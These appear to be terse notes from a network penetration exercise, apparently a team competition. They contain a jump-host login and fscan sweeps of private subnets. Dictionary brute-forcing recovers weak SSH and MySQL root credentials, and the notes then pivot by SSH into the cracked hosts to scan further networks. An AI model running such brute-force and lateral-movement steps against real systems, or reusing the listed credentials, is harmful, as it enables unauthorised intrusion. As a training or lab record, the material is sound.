跳板机IP
172.19.0.2
team27
mUFtIr3BJuNXs7zMv#M(

./fscan -h 172.19.0.0/24

(icmp) Target 172.19.0.2      is alive
(icmp) Target 172.19.0.1      is alive

DMZ 172.24.100.0/24
./fscan -h 172.24.100.0/24

start ping
(icmp) Target 172.24.100.1    is alive
(icmp) Target 172.24.100.24   is alive
(icmp) Target 172.24.100.18   is alive
(icmp) Target 172.24.100.155  is alive
[*] Icmp alive hosts len is: 4

./fscan -h 172.24.100.0/24 -userf ./dictionary/username-top10.txt -pwdf ./dictionary/passwd-histoty.txt
[+] SSH 172.24.100.18:22:ubuntu 123456
[+] SSH 172.24.100.24:22:user password
[+] SSH 172.24.100.155:22:ubuntu ubuntu

ssh ubuntu@172.24.100.18
nmap -sn 172.25.0.0/24
172.25.0.1


ssh user@172.24.100.24
nmap -sn 172.25.18.0/24

ssh ubuntu@172.24.100.155
./fscan -h 192.168.85.0/24 -pwdf passwords.txt -userf username.txt
start ping
(icmp) Target 192.168.85.1    is alive
(icmp) Target 192.168.85.36   is alive
(icmp) Target 192.168.85.129  is alive
(icmp) Target 192.168.85.201  is alive
[*] Icmp alive hosts len is: 4

[+] SSH 192.168.85.129:22:ubuntu 1qaz2wsx
[+] mysql 192.168.85.201:3306:root P@ssw0rd

ping -c 1 -t 1 172.24.100.18
ping -c 1 172.24.100.18

爆破结果：
[+] SSH 172.24.100.18:22:ubuntu 123456
[+] SSH 172.24.100.24:22:user password
[+] SSH 172.24.100.155:22:ubuntu ubuntu
[+] SSH 192.168.85.129:22:ubuntu 1qaz2wsx
[+] mysql 192.168.85.201:3306:root P@ssw0rd
